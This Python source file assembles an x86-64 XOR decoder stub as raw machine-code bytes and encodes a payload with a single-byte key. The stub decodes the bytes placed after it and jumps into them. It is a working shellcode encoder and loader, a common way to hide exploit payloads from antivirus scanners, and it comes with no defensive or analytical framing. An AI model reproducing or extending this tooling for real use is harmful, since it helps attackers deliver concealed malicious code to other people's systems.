import sys

XOR_KEY = 0x5A


def build_xor_stub(payload_len: int, key: int) -> bytes:
    if payload_len <= 0 or payload_len > 0xFFFFFFFF:
        raise ValueError("Payload length must be in 1..0xFFFFFFFF")

    stub = bytearray([
        # 0: lea rsi, [rip+0x17]   ; payload starts 30 bytes from stub start
        0x48, 0x8D, 0x35, 0x17, 0x00, 0x00, 0x00,
        # 7: mov ecx, <len> ; using placeholder bytes
        0xB9, 0x00, 0x00, 0x00, 0x00,
        # 12: mov al, <key> ; using placeholder bytes
        0xB0, 0x00,
        # 14: xor byte ptr [rsi], al
        0x30, 0x06,
        # 16: inc rsi
        0x48, 0xFF, 0xC6,
        # 19: loop decode_loop (back -7 bytes)
        0xE2, 0xF9,
        # 21: lea rax, [rip+0x2]   ; payload again
        0x48, 0x8D, 0x05, 0x02, 0x00, 0x00, 0x00,
        # 28: jmp rax
        0xFF, 0xE0,
    ])

    # Patch length (little-endian) at offset 8
    stub[8:12] = payload_len.to_bytes(4, byteorder="little")
    # Patch XOR key at offset 13
    stub[13] = key & 0xFF

    return bytes(stub)


def xor_encode(payload: bytes, key: int) -> bytes:
    return bytes(b ^ (key & 0xFF) for b in payload)
